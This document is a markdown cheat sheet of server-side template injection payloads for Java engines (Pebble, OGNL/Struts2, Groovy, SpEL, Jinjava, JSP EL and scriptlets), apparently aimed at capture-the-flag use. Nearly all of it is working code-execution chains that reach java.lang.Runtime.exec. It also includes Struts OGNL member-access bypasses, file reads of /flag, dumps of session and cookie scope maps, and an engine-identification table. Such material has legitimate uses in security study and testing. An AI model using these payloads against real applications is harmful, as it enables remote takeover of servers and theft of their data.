# Other Java engines — Pebble, OGNL, Groovy, SpEL, Jinjava

Java SSTI beyond FreeMarker/Velocity/Thymeleaf — each has its own
syntax and class-access primitive.

---

## 1. Pebble — `{{ }}`/`{% %}` Java engine

```java
{{7*7}}                         → 49
{{'a'.toUpperCase()}}           → A — method calls work
{{'a'.getClass()}}               -- class object — the escape root
{{'a'.getClass().forName('java.lang.Runtime')}}
{{'a'.getClass().forName('java.lang.Runtime').getRuntime().exec('id')}}
{{''.getClass().forName('java.lang.Runtime').getMethod('exec',''.getClass())
  .invoke(''.getClass().forName('java.lang.Runtime').getRuntime(),'id')}}
```

Pebble exposes `.getClass()` by default (no secure-uber-spect like
Velocity unless configured). The full Runtime chain is the RCE.

Bean-access variant — `getX()` resolves via `.x`:

```java
{{request.getSession().getAttribute('x')}}
{{bean.method()}}
{{bean.class.forName('java.lang.Runtime')...}}
```

---

## 2. OGNL — Struts2 expression language

```ognl
%{7*7}                          → 49
${7*7}
%{@java.lang.Runtime@getRuntime().exec('id')}
%{#rt=@java.lang.Runtime@getRuntime(),#rt.exec('id')}
%{new java.lang.ProcessBuilder('id').start()}
%{#_memberAccess}
%{#context['xwork.MethodAccessor.denyMethodExecution']=false}
   -- the S2-045-style member-access unlock then exec

%{(#_='multipart/form-data').(#_memberAccess?
  @ognl.OgnlContext@DEFAULT_MEMBER_ACCESS:
  #_memberAccess).(@java.lang.Runtime@getRuntime().exec('id'))}
   -- the real-world Struts OGNL bypass chains — context-key
      manipulation first, then Runtime
```

OGNL `@Class@staticMethod` is the static-access syntax;
`#context`/`#_memberAccess` gates must be flipped before exec.
Struts2 CVE payloads mutate `_memberAccess`/`denyMethodExecution`
first — the pattern to mirror in templates.

---

## 3. Groovy templates — GSP/GStringTemplate

```groovy
${7*7}                          → 49
${'id'.execute()}                -- String.execute()!
${'id'.execute().text}
${'cat /flag'.execute().text}
${new File('/flag').text}
${Runtime.getRuntime().exec('id')}
${['id'].execute()}
${["sh","-c","cat /flag"].execute().text}
```

Groovy's `.execute()` on String/Array = ProcessBuilder shortcut —
the shortest RCE in Java-land.

```groovy
<% Runtime.getRuntime().exec('id') %>   -- GSP scriptlet
<%= 'id'.execute().text %>               -- GSP output
```

---

## 4. SpEL — Spring Expression Language (outside Thymeleaf)

```java
T(java.lang.Runtime).getRuntime().exec('id')
T(Runtime).getRuntime().exec('id')         -- short-name if imported
new java.util.Scanner(new java.io.File('/flag')).next()
T(java.lang.Class).forName('java.lang.Runtime')
  .getMethod('exec',T(String)).invoke(...)
#{T(java.lang.Runtime).getRuntime().exec('id')}    -- in @Value ctx
```

SpEL appears in: Spring `@Value`, `@PreAuthorize`, MessageSource,
DataBinder expressions, Actuator `/env` endpoints accepting SpEL.

---

## 5. Jinjava — Jinja-syntax on the JVM (HubSpot)

```jinja2
{{7*7}}                          → 49
{{'a'.getClass()}}                -- java method access
{{'a'.getClass().forName('java.lang.Runtime').getRuntime().exec('id')}}
{{request}} {{context}}            -- bound objects
```

Jinjava honors the Jinja syntax but the underlying objects are
Java — `.getClass().forName(...)` chains reach Runtime.

---

## 6. JSF/JSP/EL — `${}` contexts

```java
${7*7}                             → 49 (EL 3.0+ allows = op)
${'a'.getClass()}
${''.getClass().forName('java.lang.Runtime')}
${''.getClass().forName('java.lang.Runtime').getRuntime().exec('id')}
${pageContext}
${applicationScope}                   -- all scope maps
${sessionScope}
${param.x}
${header['user-agent']}
${cookie['session'].value}
```

EL 2.2 vs 3.0 differ — `=` operator + lambda only in 3.0. The
scope-maps (`applicationScope`,`sessionScope`,`param`,`header`,
`cookie`) dump everything bound — often flag-holding.

---

## 7. Apache Tiles/JSP scriptlets — `<% %>` dead-zone

```jsp
<%= Runtime.getRuntime().exec("id") %>   -- JSP scriptlet
<% out.print(`id`) %>                      -- scriptlet + backtick? no —
                                          Java has no backticks;
                                          use Process/Runtime
<%= new java.util.Scanner(new java.io.File("/flag")).useDelimiter("\\Z").next() %>
```

JSP scriptlets are raw Java — no sandbox at all.

---

## 8. The engine-ID hints

```text
{{}} + getClass() reaching java.lang.Class      → Pebble or Jinjava
%{} or ${} in Struts                            → OGNL
${'x'.execute()}                                 → Groovy
${param.x} + scope-maps                          → JSP EL
#{} in Thymeleaf attrs                           → SpEL
{{}} + HubSpot                                    → Jinjava
```
